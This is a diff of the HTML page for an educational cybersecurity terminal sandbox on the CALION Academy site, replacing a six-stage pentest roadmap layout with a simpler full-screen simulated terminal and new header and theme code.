@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html class="scroll-smooth" lang="en">
+<html class="scroll-smooth h-full" lang="en">
 <head>
   <meta charset="utf-8"/>
   <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-  <title>Terminal Practice Sandbox · CALION Academy</title>
-  <meta content="Interactive cybersecurity terminal sandbox featuring a structured 6-stage penetration testing roadmap with authentic tool outputs for Linux, Nmap, Gobuster, Hydra, SQLMap, and Privilege Escalation." name="description"/>
+  <title>Terminal Sandbox · CALION Academy</title>
+  <meta content="Full-screen interactive cybersecurity terminal sandbox with simulated Linux utilities, networking tools, and security exercises." name="description"/>
   <link rel="icon" type="image/png" href="handbook/assets/favicon.png"/>
   <link rel="canonical" href="https://learning.endlessus.in/terminal-lab.html"/>
 
@@ -14,19 +14,19 @@
 
   <link rel="preconnect" href="https://fonts.googleapis.com"/>
   <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet"/>
   <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet"/>
 
   <!-- Immediate Theme Initializer -->
   <script>
     (function() {
-      const savedTheme = localStorage.getItem('endlessus_learning_theme') || 'normal';
-      if (savedTheme === 'hacker') {
+      const savedTheme = localStorage.getItem('calion_theme') || localStorage.getItem('endlessus_learning_theme') || 'light';
+      if (savedTheme === 'dark' || savedTheme === 'hacker') {
         document.documentElement.classList.add('dark', 'theme-hacker');
-        document.documentElement.classList.remove('theme-normal');
+        document.documentElement.classList.remove('theme-normal', 'light');
       } else {
+        document.documentElement.classList.add('light', 'theme-normal');
         document.documentElement.classList.remove('dark', 'theme-hacker');
-        document.documentElement.classList.add('theme-normal');
       }
     })();
   </script>
@@ -56,1241 +56,208 @@
             'danger-critical': 'var(--color-danger-critical)',
           },
           fontFamily: {
-            sans: ['Inter', 'sans-serif'],
-            mono: ['JetBrains Mono', 'monospace'],
+            sans: ['Inter', '-apple-system', 'sans-serif'],
+            headline: ['Space Grotesk', 'sans-serif'],
+            mono: ['"JetBrains Mono"', 'monospace'],
           }
         }
       }
-    }
+    };
   </script>
-  <style>
-    body {
-      background-color: var(--color-canvas-base);
-      color: var(--color-on-surface);
-      font-family: 'Inter', sans-serif;
-      transition: background-color 0.2s ease, color 0.2s ease;
-    }
-    .material-symbols-outlined {
-      font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24;
-      display: inline-block;
-      vertical-align: middle;
-      line-height: 1;
-    }
-    .telemetry-grid {
-      background-size: 32px 32px;
-      background-image:
-        linear-gradient(to right, rgba(31, 41, 55, 0.08) 1px, transparent 1px),
-        linear-gradient(to bottom, rgba(31, 41, 55, 0.08) 1px, transparent 1px);
-    }
-    html.dark .telemetry-grid {
-      background-image:
-        linear-gradient(to right, rgba(31, 41, 55, 0.25) 1px, transparent 1px),
-        linear-gradient(to bottom, rgba(31, 41, 55, 0.25) 1px, transparent 1px);
-    }
-    @keyframes pulse-fast {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0; }
-    }
-    .cursor-blink { animation: pulse-fast 1s infinite; }
-  </style>
 </head>
-<body class="bg-canvas-base text-on-surface antialiased telemetry-grid min-h-screen flex flex-col font-sans selection:bg-primary selection:text-white">
+<body class="bg-canvas-base text-on-surface font-sans antialiased h-full flex flex-col overflow-hidden transition-colors duration-200">
 
-  <!-- =========================================================================
-       ACADEMY UNIFIED HEADER
-       ========================================================================= -->
-  <header class="sticky top-0 z-50 w-full border-b border-border-hairline bg-surface-subtle/95 backdrop-blur-md">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
+  <!-- ========================================================================= -->
+  <!-- 1. MINIMAL ACADEMY HEADER                                                 -->
+  <!-- ========================================================================= -->
+  <header class="w-full border-b border-border-hairline bg-surface-subtle/95 backdrop-blur-md shrink-0">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 h-14 flex items-center justify-between">
       
-      <!-- Brand -->
+      <!-- Brand & Section -->
       <div class="flex items-center gap-3">
-        <a href="learning.html" class="flex items-center gap-2.5 group">
-          <span class="w-8 h-8 rounded-lg bg-primary/10 border border-primary/40 text-primary flex items-center justify-center font-mono font-bold text-sm group-hover:scale-105 transition-transform">C</span>
-          <div class="flex flex-col">
-            <span class="font-bold text-sm tracking-tight text-on-surface group-hover:text-primary transition-colors">CALION Academy</span>
-            <span class="font-mono text-[10px] text-outline tracking-wider uppercase">Terminal Sandbox</span>
-          </div>
+        <a href="learning.html" class="flex items-center gap-2 group">
+          <span class="w-7 h-7 rounded-lg bg-primary/10 border border-primary/40 text-primary flex items-center justify-center font-mono font-bold text-xs group-hover:scale-105 transition-transform">C</span>
+          <span class="font-bold text-sm tracking-tight text-on-surface group-hover:text-primary transition-colors">CALION Academy</span>
         </a>
+        <span class="text-outline">/</span>
+        <span class="font-mono text-xs font-bold text-primary flex items-center gap-1">
+          <span class="material-symbols-outlined text-[15px]">terminal</span>
+          <span>Terminal Sandbox</span>
+        </span>
       </div>
 
-      <!-- Unified Hierarchy Navigation: Learn · Practice · Reference · Portfolio -->
-      <nav class="hidden lg:flex items-center space-x-1 text-xs">
-        
-        <!-- Learn Popover -->
-        <div class="relative group">
-          <button type="button" class="flex items-center gap-1 px-3 py-1.5 rounded-lg text-on-surface-variant hover:text-on-surface hover:bg-surface-raised transition-colors font-medium cursor-pointer" aria-haspopup="true">
-            <span class="material-symbols-outlined text-sm">school</span>
-            <span>Learn</span>
-            <span class="material-symbols-outlined text-xs">arrow_drop_down</span>
-          </button>
-          <div class="absolute left-0 mt-1 w-52 py-2 rounded-xl bg-surface-subtle border border-border-hairline shadow-xl opacity-0 invisible group-hover:opacity-100 group-hover:visible group-focus-within:opacity-100 group-focus-within:visible transition-all z-50">
-            <a href="learning.html#start-here" class="flex items-center gap-2 px-3 py-2 text-xs text-on-surface-variant hover:text-primary hover:bg-surface-raised">
-              <span class="material-symbols-outlined text-sm text-primary">play_arrow</span>
-              <div>
-                <div class="font-bold text-on-surface">Start Here</div>
-                <div class="text-[10px] text-outline">Zero prerequisites guide</div>
-              </div>
-            </a>
-            <a href="learning.html#curriculum" class="flex items-center gap-2 px-3 py-2 text-xs text-on-surface-variant hover:text-primary hover:bg-surface-raised">
-              <span class="material-symbols-outlined text-sm text-secondary">menu_book</span>
-              <div>
-                <div class="font-bold text-on-surface">Full Curriculum</div>
-                <div class="text-[10px] text-outline">40 guided core rooms</div>
-              </div>
-            </a>
-            <a href="learning.html#progress" class="flex items-center gap-2 px-3 py-2 text-xs text-on-surface-variant hover:text-primary hover:bg-surface-raised">
-              <span class="material-symbols-outlined text-sm text-warning">verified</span>
-              <div>
-                <div class="font-bold text-on-surface">My Progress</div>
-                <div class="text-[10px] text-outline">Track completion & badges</div>
-              </div>
-            </a>
-          </div>
-        </div>
-
-        <!-- Practice Popover (Active) -->
-        <div class="relative group">
-          <button type="button" class="flex items-center gap-1 px-3 py-1.5 rounded-lg text-primary font-bold bg-primary/10 border border-primary/30 transition-colors cursor-pointer" aria-current="page" aria-haspopup="true">
-            <span class="material-symbols-outlined text-sm">terminal</span>
-            <span>Practice</span>
-            <span class="material-symbols-outlined text-xs">arrow_drop_down</span>
-          </button>
-          <div class="absolute left-0 mt-1 w-56 py-2 rounded-xl bg-surface-subtle border border-border-hairline shadow-xl opacity-0 invisible group-hover:opacity-100 group-hover:visible group-focus-within:opacity-100 group-focus-within:visible transition-all z-50">
-            <a href="labs.html" class="flex items-center gap-2 px-3 py-2 text-xs text-on-surface-variant hover:text-primary hover:bg-surface-raised">
-              <span class="material-symbols-outlined text-sm text-primary">science</span>
-              <div>
-                <div class="font-bold text-on-surface">Practical Labs</div>
-                <div class="text-[10px] text-outline">13 guided workspaces</div>
-              </div>
-            </a>
-            <a href="terminal-lab.html" class="flex items-center gap-2 px-3 py-2 text-xs text-primary font-bold bg-primary/10">
-              <span class="material-symbols-outlined text-sm text-secondary">computer</span>
-              <div>
-                <div class="font-bold text-primary">Terminal Practice</div>
-                <div class="text-[10px] text-outline">Interactive Linux command sandbox</div>
-              </div>
-            </a>
-          </div>
-        </div>
-
-        <!-- Reference Popover -->
-        <div class="relative group">
-          <button type="button" class="flex items-center gap-1 px-3 py-1.5 rounded-lg text-on-surface-variant hover:text-on-surface hover:bg-surface-raised transition-colors font-medium cursor-pointer" aria-haspopup="true">
-            <span class="material-symbols-outlined text-sm">library_books</span>
-            <span>Reference</span>
-            <span class="material-symbols-outlined text-xs">arrow_drop_down</span>
-          </button>
-          <div class="absolute left-0 mt-1 w-56 py-2 rounded-xl bg-surface-subtle border border-border-hairline shadow-xl opacity-0 invisible group-hover:opacity-100 group-hover:visible group-focus-within:opacity-100 group-focus-within:visible transition-all z-50">
-            <a href="theory.html" class="flex items-center gap-2 px-3 py-2 text-xs text-on-surface-variant hover:text-primary hover:bg-surface-raised">
-              <span class="material-symbols-outlined text-sm text-secondary">psychology</span>
-              <div>
-                <div class="font-bold text-on-surface">Theory &amp; Concepts</div>
-                <div class="text-[10px] text-outline">Theoretical cybersecurity foundations</div>
-              </div>
-            </a>
-            <a href="handbook/index.html" class="flex items-center gap-2 px-3 py-2 text-xs text-on-surface-variant hover:text-primary hover:bg-surface-raised">
-              <span class="material-symbols-outlined text-sm text-primary">menu_book</span>
-              <div>
-                <div class="font-bold text-on-surface">Command Handbook</div>
-                <div class="text-[10px] text-outline">15 modular security guides</div>
-              </div>
-            </a>
-            <a href="methodology.html" class="flex items-center gap-2 px-3 py-2 text-xs text-on-surface-variant hover:text-primary hover:bg-surface-raised">
-              <span class="material-symbols-outlined text-sm text-danger-critical">security</span>
-              <div>
-                <div class="font-bold text-on-surface">Pentest Methodology</div>
-                <div class="text-[10px] text-outline">12-stage framework &amp; attack matrix</div>
-              </div>
-            </a>
-            <a href="glossary.html" class="flex items-center gap-2 px-3 py-2 text-xs text-on-surface-variant hover:text-primary hover:bg-surface-raised">
-              <span class="material-symbols-outlined text-sm text-secondary">auto_stories</span>
-              <div>
-                <div class="font-bold text-on-surface">Cybersecurity Glossary</div>
-                <div class="text-[10px] text-outline">60+ searchable terms &amp; concepts</div>
-              </div>
-            </a>
-            <a href="roadmap.html" class="flex items-center gap-2 px-3 py-2 text-xs text-on-surface-variant hover:text-primary hover:bg-surface-raised">
-              <span class="material-symbols-outlined text-sm text-accent">alt_route</span>
-              <div>
-                <div class="font-bold text-on-surface">Career Roadmap</div>
-                <div class="text-[10px] text-outline">11-discipline milestone map</div>
-              </div>
-            </a>
-          </div>
-        </div>
-
-        <!-- Portfolio Link -->
-        <a href="index.html" class="flex items-center gap-1 px-3 py-1.5 rounded-lg text-on-surface-variant hover:text-on-surface hover:bg-surface-raised transition-colors font-medium">
-          <span class="material-symbols-outlined text-sm">person</span>
-          <span>Portfolio</span>
+      <!-- Center Links (Minimal: Learn & Terminal) -->
+      <nav class="hidden md:flex items-center gap-1 text-xs font-mono">
+        <a href="learning.html" class="px-3 py-1.5 rounded-lg text-on-surface-variant hover:text-primary hover:bg-surface-raised flex items-center gap-1.5 transition-colors">
+          <span class="material-symbols-outlined text-[15px]">school</span>
+          <span>Learning Tree</span>
+        </a>
+        <a href="terminal-lab.html" class="px-3 py-1.5 rounded-lg text-primary font-bold bg-primary/10 border border-primary/20 flex items-center gap-1.5 transition-colors">
+          <span class="material-symbols-outlined text-[15px]">terminal</span>
+          <span>Terminal Sandbox</span>
         </a>
       </nav>
 
-      <!-- Header Controls: Streak & XP, Cheatsheet, Search, Auth Slot, Theme Toggle, Mobile Toggle -->
-      <div class="flex items-center gap-2 sm:gap-3 font-mono text-xs">
-        <!-- Streak Pill -->
+      <!-- Right Controls: Cheatsheet, Clear, Theme, Profile -->
+      <div class="flex items-center gap-2 font-mono text-xs">
+        
+        <!-- Quick Cheatsheet Button -->
+        <button id="quick-cheatsheet-btn" class="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg border border-primary/40 bg-primary/10 text-primary hover:bg-primary hover:text-white transition-all font-bold cursor-pointer" title="View Quick Command Cheatsheet">
+          <span class="material-symbols-outlined text-sm">bolt</span>
+          <span class="hidden sm:inline">Cheatsheet</span>
+        </button>
+
+        <!-- Clear Button -->
+        <button id="term-clear-btn" class="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg border border-border-hairline bg-surface-raised hover:border-primary text-outline hover:text-on-surface transition-colors cursor-pointer" title="Clear Terminal Buffer">
+          <span class="material-symbols-outlined text-sm">clear_all</span>
+          <span class="hidden sm:inline">Clear</span>
+        </button>
+
+        <!-- Daily Streak -->
         <div class="hidden sm:flex items-center gap-1 px-2.5 py-1 rounded-lg border border-border-hairline bg-surface-raised text-on-surface" title="Current Daily Streak">
-          <span class="text-amber-500">🔥</span>
+          <span>🔥</span>
           <span id="header-streak-pill" class="font-bold">1d</span>
         </div>
 
-        <!-- XP Pill -->
-        <div class="hidden sm:flex items-center gap-1 px-2.5 py-1 rounded-lg border border-border-hairline bg-surface-raised text-on-surface" title="Total Accumulated XP">
-          <span class="text-primary font-bold">⚡</span>
-          <span id="header-xp-pill" class="font-bold">0 XP</span>
-        </div>
-
-        <!-- Quick Cheatsheet Button -->
-        <button id="quick-cheatsheet-btn" class="inline-flex items-center gap-1 px-2.5 py-1.5 rounded border border-primary/40 bg-primary/10 font-mono text-xs text-primary hover:bg-primary hover:text-white transition-all font-bold cursor-pointer" title="View Quick Command Cheatsheet">
-          <span class="material-symbols-outlined text-sm">bolt</span>
-          <span>Cheatsheet</span>
-        </button>
-        
-        <!-- Search Trigger -->
-        <button type="button" class="academy-search-btn inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-border-hairline bg-surface-raised hover:border-primary text-xs font-mono text-outline hover:text-on-surface transition-colors cursor-pointer" title="Search Academy (Cmd+K)">
-          <span class="material-symbols-outlined text-sm text-primary">search</span>
-          <span class="hidden lg:inline">Search</span>
-          <kbd class="hidden lg:inline px-1 py-0.2 rounded bg-surface-subtle border border-border-hairline text-[10px]">⌘K</kbd>
-        </button>
-
-        <!-- Auth Slot -->
-        <div id="academy-auth-slot"></div>
-
-        <!-- Theme Toggle: Normal View vs Hacker View -->
-        <div class="flex items-center border border-border-hairline rounded-lg p-0.5 bg-surface-raised text-xs font-mono">
-          <button type="button" id="theme-toggle-normal" class="px-2 py-1 rounded text-xs flex items-center gap-1 font-bold bg-primary text-white" title="Switch to Normal View (Light mode)">
+        <!-- Theme Toggle -->
+        <div class="flex items-center border border-border-hairline rounded-lg p-0.5 bg-surface-raised text-xs">
+          <button type="button" id="theme-toggle-normal" class="px-2 py-1 rounded text-xs flex items-center gap-1 font-bold" title="Light theme">
             <span class="material-symbols-outlined text-xs">light_mode</span>
-            <span class="hidden sm:inline">Normal</span>
           </button>
-          <button type="button" id="theme-toggle-hacker" class="px-2 py-1 rounded text-xs flex items-center gap-1 font-bold text-outline hover:text-on-surface" title="Switch to Hacker View (Dark HUD)">
+          <button type="button" id="theme-toggle-hacker" class="px-2 py-1 rounded text-xs flex items-center gap-1 font-bold" title="Dark theme">
             <span class="material-symbols-outlined text-xs">terminal</span>
-            <span class="hidden sm:inline">Hacker</span>
           </button>
         </div>
 
-        <!-- Mobile Menu Toggle Button -->
-        <button type="button" id="mobile-menu-btn" class="lg:hidden p-2 rounded-lg border border-border-hairline bg-surface-raised text-on-surface" aria-label="Toggle Mobile Menu">
-          <span class="material-symbols-outlined text-base">menu</span>
-        </button>
+        <!-- Cadet Avatar / Profile -->
+        <a href="profile.html" class="w-7 h-7 rounded-full bg-gradient-to-tr from-sky-500 to-indigo-600 text-white font-mono text-xs font-bold flex items-center justify-center shadow-sm" id="cadet-avatar-badge" title="View Profile">
+          CA
+        </a>
       </div>
-    </div>
 
-    <!-- Contextual Breadcrumb Sub-Header -->
-    <div class="border-t border-border-hairline bg-surface-raised/70 px-4 sm:px-6 py-2 text-xs">
-      <div class="max-w-7xl mx-auto flex items-center justify-between">
-        <div class="flex items-center gap-1.5 text-on-surface-variant font-mono text-[11px]">
-          <a href="learning.html" class="hover:text-primary transition-colors flex items-center gap-1">
-            <span class="material-symbols-outlined text-xs">school</span>
-            <span>Academy</span>
-          </a>
-          <span class="text-outline">/</span>
-          <span>Practice</span>
-          <span class="text-outline">/</span>
-          <span class="text-primary font-bold">Terminal Practice</span>
-        </div>
-        <div class="flex items-center gap-2 font-mono text-[11px]">
-          <button id="target-info-btn" class="text-outline hover:text-secondary flex items-center gap-1">
-            <span class="material-symbols-outlined text-xs text-secondary">gps_fixed</span>
-            <span>Target: 10.10.110.45</span>
-          </button>
-          <span class="text-outline">·</span>
-          <a href="labs.html" class="text-primary hover:underline">Practical Labs &rarr;</a>
-        </div>
-      </div>
-    </div>
-
-    <!-- Mobile Drawer for Navigation -->
-    <div id="mobile-drawer" class="academy-mobile-drawer">
-      <div>
-        <div class="academy-mobile-group-title">LEARN</div>
-        <a href="learning.html#start-here" class="academy-mobile-link">Start Here (Zero Prerequisites)</a>
-        <a href="learning.html#curriculum" class="academy-mobile-link">Full Curriculum (40 Rooms)</a>
-        <a href="learning.html#progress" class="academy-mobile-link">My Progress & Milestones</a>
-      </div>
-      <div>
-        <div class="academy-mobile-group-title">PRACTICE</div>
-        <a href="labs.html" class="academy-mobile-link">Practical Labs (13)</a>
-        <a href="terminal-lab.html" class="academy-mobile-link active">Terminal Practice Sandbox</a>
-      </div>
-      <div>
-        <div class="academy-mobile-group-title">REFERENCE</div>
-        <a href="theory.html" class="academy-mobile-link">Theory & Concepts</a>
-        <a href="handbook/index.html" class="academy-mobile-link">Command Handbook</a>
-        <a href="methodology.html" class="academy-mobile-link">Pentest Methodology</a>
-        <a href="glossary.html" class="academy-mobile-link">Cybersecurity Glossary</a>
-        <a href="roadmap.html" class="academy-mobile-link">Career Roadmap</a>
-      </div>
-      <div>
-        <div class="academy-mobile-group-title">PORTFOLIO</div>
-        <a href="index.html" class="academy-mobile-link">Mihraj Mashhoor K Portfolio</a>
-      </div>
     </div>
   </header>
 
   <!-- ========================================================================= -->
-  <!-- Structured Roadmap Progress Tracker Banner                                -->
+  <!-- 2. FULL-SCREEN INTERACTIVE TERMINAL WORKSTATION                           -->
   <!-- ========================================================================= -->
-  <section class="border-b border-border-hairline bg-canvas-base/90 px-4 sm:px-6 py-3">
-    <div class="max-w-7xl mx-auto flex flex-col md:flex-row md:items-center justify-between gap-4">
+  <main class="flex-1 w-full flex flex-col p-2 sm:p-4 min-h-0 bg-canvas-base">
+    <div class="flex-1 flex flex-col rounded-2xl border border-border-hairline bg-[#090D14] shadow-2xl overflow-hidden font-mono text-xs">
       
-      <!-- Left: Title & Progress Bar -->
-      <div class="space-y-1.5">
-        <div class="flex items-center gap-2 font-mono text-xs">
-          <span class="material-symbols-outlined text-sm text-primary">route</span>
-          <span class="font-bold text-on-surface">PRACTITIONER ROADMAP: 6-STAGE LAB METHODOLOGY</span>
-          <span class="text-outline text-[11px]">(Click any stage to jump)</span>
+      <!-- Terminal Top Chrome -->
+      <div class="px-4 py-2.5 bg-[#0e131f] border-b border-[#1b2234] flex items-center justify-between text-xs select-none">
+        <div class="flex items-center gap-2">
+          <div class="w-3 h-3 rounded-full bg-rose-500/80"></div>
+          <div class="w-3 h-3 rounded-full bg-amber-500/80"></div>
+          <div class="w-3 h-3 rounded-full bg-emerald-500/80"></div>
+          <span class="text-slate-400 font-bold ml-2 hidden sm:inline text-[11px]">cadet@calion-sandbox: ~ (bash 5.2)</span>
         </div>
-        <div class="flex items-center gap-3">
-          <div class="w-48 sm:w-64 h-2 rounded-full bg-surface-raised border border-border-hairline overflow-hidden">
-            <div id="roadmap-progress-bar" class="h-full bg-gradient-to-r from-primary to-secondary transition-all duration-300" style="width: 16.6%;"></div>
-          </div>
-          <span id="roadmap-progress-label" class="font-mono text-xs text-primary font-bold">1 / 6 Completed (17%)</span>
-        </div>
-      </div>
-
-      <!-- Right: Milestone Pills -->
-      <div class="flex flex-wrap items-center gap-1.5 font-mono text-[10px]" id="roadmap-milestones">
-        <button class="stage-pill active px-2.5 py-1 rounded-md border border-primary/50 bg-primary/10 text-primary font-bold transition-all flex items-center gap-1" data-stage="1">
-          <span class="w-1.5 h-1.5 rounded-full bg-primary"></span>
-          <span>01 Host Recon</span>
-        </button>
-        <button class="stage-pill px-2.5 py-1 rounded-md border border-border-hairline bg-surface-raised text-on-surface-variant hover:border-primary/40 transition-all flex items-center gap-1" data-stage="2">
-          <span>02 Nmap Ports</span>
-        </button>
-        <button class="stage-pill px-2.5 py-1 rounded-md border border-border-hairline bg-surface-raised text-on-surface-variant hover:border-primary/40 transition-all flex items-center gap-1" data-stage="3">
-          <span>03 Vuln Scan</span>
-        </button>
-        <button class="stage-pill px-2.5 py-1 rounded-md border border-border-hairline bg-surface-raised text-on-surface-variant hover:border-primary/40 transition-all flex items-center gap-1" data-stage="4">
-          <span>04 Web &amp; SQLi</span>
-        </button>
-        <button class="stage-pill px-2.5 py-1 rounded-md border border-border-hairline bg-surface-raised text-on-surface-variant hover:border-primary/40 transition-all flex items-center gap-1" data-stage="5">
-          <span>05 Passwords</span>
-        </button>
-        <button class="stage-pill px-2.5 py-1 rounded-md border border-border-hairline bg-surface-raised text-on-surface-variant hover:border-primary/40 transition-all flex items-center gap-1" data-stage="6">
-          <span>06 Root Shell</span>
-        </button>
-      </div>
-
-    </div>
-  </section>
-
-  <!-- ========================================================================= -->
-  <!-- Main Dual-Pane Sandbox                                                    -->
-  <!-- ========================================================================= -->
-  <main class="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 py-6 grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
-    
-    <!-- LEFT COLUMN: Learning Modules & Practical Scenarios (5 Cols) -->
-    <div class="lg:col-span-5 space-y-4">
-      
-      <!-- Module Navigation Tabs -->
-      <div class="p-2 rounded-xl bg-surface-subtle border border-border-hairline">
-        <div class="font-mono text-[10px] text-outline px-2 py-1 uppercase tracking-wider flex items-center justify-between">
-          <span>Select Curriculum Track:</span>
-          <span class="text-primary font-bold">Includes Expected Output</span>
-        </div>
-        <div class="grid grid-cols-3 sm:grid-cols-4 gap-1.5 mt-1 font-mono text-xs" id="track-tabs">
-          <button class="track-tab-btn active col-span-2 px-2.5 py-2 rounded-lg bg-primary/10 border border-primary/40 text-primary font-bold transition-all text-left flex items-center gap-1.5" data-track="roadmap">
-            <span class="material-symbols-outlined text-sm">route</span>
-            <span>Guided Roadmap</span>
-          </button>
-          <button class="track-tab-btn px-2.5 py-2 rounded-lg bg-surface-raised border border-border-hairline text-on-surface-variant hover:text-primary transition-all text-left flex items-center gap-1.5" data-track="linux">
-            <span class="material-symbols-outlined text-sm">terminal</span>
-            <span>Linux Core</span>
-          </button>
-          <button class="track-tab-btn px-2.5 py-2 rounded-lg bg-surface-raised border border-border-hairline text-on-surface-variant hover:text-primary transition-all text-left flex items-center gap-1.5" data-track="nmap">
-            <span class="material-symbols-outlined text-sm">radar</span>
-            <span>Nmap Recon</span>
-          </button>
-          <button class="track-tab-btn px-2.5 py-2 rounded-lg bg-surface-raised border border-border-hairline text-on-surface-variant hover:text-secondary transition-all text-left flex items-center gap-1.5" data-track="web">
-            <span class="material-symbols-outlined text-sm">language</span>
-            <span>Web Fuzzing</span>
-          </button>
-          <button class="track-tab-btn px-2.5 py-2 rounded-lg bg-surface-raised border border-border-hairline text-on-surface-variant hover:text-warning transition-all text-left flex items-center gap-1.5" data-track="passwords">
-            <span class="material-symbols-outlined text-sm">key</span>
-            <span>Passwords</span>
-          </button>
-          <button class="track-tab-btn px-2.5 py-2 rounded-lg bg-surface-raised border border-border-hairline text-on-surface-variant hover:text-primary transition-all text-left flex items-center gap-1.5" data-track="privesc">
-            <span class="material-symbols-outlined text-sm">shield</span>
-            <span>PrivEsc</span>
-          </button>
-          <button class="track-tab-btn px-2.5 py-2 rounded-lg bg-surface-raised border border-border-hairline text-on-surface-variant hover:text-danger-critical transition-all text-left flex items-center gap-1.5" data-track="metasploit">
-            <span class="material-symbols-outlined text-sm">bug_report</span>
-            <span>Metasploit</span>
-          </button>
-        </div>
-      </div>
-
-      <!-- Module Content Container -->
-      <div id="module-cards-container" class="space-y-3.5 max-h-[720px] overflow-y-auto pr-1">
-        <!-- Injected via JavaScript based on active track -->
-      </div>
-
-    </div>
-
-    <!-- RIGHT COLUMN: Full Interactive Terminal Workstation (7 Cols) -->
-    <div class="lg:col-span-7 flex flex-col h-[600px] sm:h-[680px] lg:h-[780px] rounded-2xl bg-surface-subtle border border-primary/50 shadow-[0_0_60px_rgba(78,222,163,0.15)] overflow-hidden font-mono text-xs">
-      
-      <!-- Terminal Window Bar -->
-      <div class="flex items-center justify-between px-4 py-2.5 bg-surface-raised border-b border-border-hairline select-none">
-        <div class="flex items-center gap-2 min-w-0">
-          <span class="w-3 h-3 rounded-full bg-danger-critical inline-block shrink-0"></span>
-          <span class="w-3 h-3 rounded-full bg-warning inline-block shrink-0"></span>
-          <span class="w-3 h-3 rounded-full bg-primary inline-block shrink-0"></span>
-          <span class="text-on-surface text-xs font-bold ml-2 flex items-center gap-1.5 truncate">
-            <span class="material-symbols-outlined text-sm text-primary shrink-0">terminal</span>
-            <span class="truncate">guest@sec-station:~/lab$ <span class="hidden sm:inline text-outline text-[11px]">(Kali Linux 6.8 · Scoped Target: 10.10.110.45)</span></span>
+        <div class="flex items-center gap-3 text-[11px] text-slate-400">
+          <span class="flex items-center gap-1 text-emerald-400">
+            <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+            <span>SANDBOX READY</span>
           </span>
-        </div>
-        <div class="flex items-center gap-2 text-[11px] shrink-0">
-          <button id="term-clear-btn" class="px-2 py-0.5 rounded bg-canvas-base border border-border-hairline text-on-surface-variant hover:text-primary hover:border-primary/40 transition-colors" title="Clear terminal screen">
-            Clear
-          </button>
-          <button id="term-copy-btn" class="px-2 py-0.5 rounded bg-canvas-base border border-border-hairline text-on-surface-variant hover:text-secondary hover:border-secondary/40 transition-colors" title="Copy terminal output">
-            Copy
+          <button type="button" id="term-copy-btn" class="hover:text-white transition-colors" title="Copy terminal output">
+            <span class="material-symbols-outlined text-sm">content_copy</span>
           </button>
         </div>
       </div>
 
       <!-- Terminal Output Screen -->
-      <div id="lab-terminal-output" class="flex-1 overflow-y-auto p-4 space-y-2.5 text-on-surface-variant leading-relaxed bg-canvas-base/90">
-        <div class="text-primary font-bold hidden sm:block">
+      <div id="lab-terminal-output" class="flex-1 overflow-y-auto p-4 sm:p-6 space-y-3 text-slate-200 leading-relaxed bg-[#070a10]">
+        <!-- Welcome Banner -->
+        <div class="text-[#00F0FF] font-bold text-xs sm:text-sm leading-snug">
           ════════════════════════════════════════════════════════════════════════════════════<br/>
-          &nbsp;&nbsp;MIHRAJ MASHOOR K // STRUCTURED CYBERSECURITY LAB &amp; PRACTICE WORKSTATION<br/>
-          &nbsp;&nbsp;SCOPED LAB TARGET: 10.10.110.45 (starlight-web.lab) // ROLE: AUTHORIZED AUDITOR<br/>
+          &nbsp;&nbsp;CALION ACADEMY // FULL-SCREEN TERMINAL LAB SANDBOX<br/>
+          &nbsp;&nbsp;SIMULATED LINUX &amp; SECURITY ENVIRONMENT // SAFE EDUCATIONAL RUNTIME<br/>
           ════════════════════════════════════════════════════════════════════════════════════
         </div>
-        <div class="text-primary font-bold sm:hidden text-center border-b border-primary/30 pb-2 text-[11px]">
-          [ MIHRAJ MASHOOR K // CYBERSECURITY LAB ]
-        </div>
-        <div class="text-on-surface bg-surface-raised/60 p-3 rounded-lg border border-border-hairline text-[11px] space-y-1.5">
+        <div class="p-3.5 rounded-xl bg-[#0e1422] border border-[#1b2234] text-xs space-y-1.5 text-slate-300">
           <div class="text-primary font-bold flex items-center gap-1.5">
-            <span class="material-symbols-outlined text-sm">school</span>
-            <span>PRACTITIONER ROADMAP ACTIVE // STAGE 01 READY</span>
+            <span class="material-symbols-outlined text-sm">terminal</span>
+            <span>INTERACTIVE CLI INITIALIZED</span>
           </div>
-          <div>• Follow the 6-stage roadmap on the left or preview the expected output before executing.</div>
-          <div>• Click <span class="text-primary font-bold">[Run in Terminal ▶]</span> on any lesson card to dispatch and observe the live simulated output and practitioner analysis.</div>
-          <div>• You can also type manual commands in the prompt below. Type <span class="text-primary font-bold">roadmap</span> to view curriculum stages directly in the CLI.</div>
+          <div>• Educational, client-side sandboxed Linux command interpreter.</div>
+          <div>• Try executing: <code class="text-[#00F0FF]">help</code>, <code class="text-[#00F0FF]">whoami</code>, <code class="text-[#00F0FF]">lscpu</code>, <code class="text-[#00F0FF]">free -h</code>, <code class="text-[#00F0FF]">nmap 10.10.110.45</code>, <code class="text-[#00F0FF]">gobuster</code>, or <code class="text-[#00F0FF]">cheatsheet</code>.</div>
+          <div>• Use <kbd class="px-1.5 py-0.5 rounded bg-slate-800 text-[10px] text-slate-400">Tab</kbd> for command autocompletion and <kbd class="px-1.5 py-0.5 rounded bg-slate-800 text-[10px] text-slate-400">↑ / ↓</kbd> for command history.</div>
         </div>
       </div>
 
-      <!-- Terminal Input Line -->
-      <div class="flex items-center gap-2 px-4 py-3 bg-surface-raised border-t border-border-hairline">
-        <span class="text-primary font-bold select-none shrink-0 flex items-center gap-1">
-          <span class="hidden sm:inline">guest@sec-station:~/lab$</span>
+      <!-- Terminal Command Input Line -->
